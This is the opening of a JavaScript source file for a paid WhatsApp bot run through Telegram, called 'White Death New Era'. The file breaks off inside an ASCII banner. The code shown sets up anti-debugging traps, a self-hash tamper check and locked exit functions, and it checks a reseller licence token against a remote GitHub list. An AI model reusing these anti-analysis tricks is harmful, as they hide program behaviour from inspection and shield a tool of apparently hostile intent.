const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = "https://raw.githubusercontent.com/althaffarez417-sudo/Ryugha/refs/heads/main/token.json";
const videoUrl = "https://files.catbox.moe/5umgoj.mp4";
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`

⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @RyuugaCool
☇ Name Script : White Death New Era
☇ Version : 1.7
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`

⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @RyuugaCool
☇ Name Script : White Death New Era
☇ Version : 1.7
  
  Bypass detected, the code in angelcase will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`

⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @RyuugaCool
☇ Name Script : White Death New Era
☇ Version : 1.7
  
  Bypass detected, the code in angelcase will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`

⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @RyuugaCool
☇ Name Script : White Death New Era
☇ Version : 1.7 
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`

⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
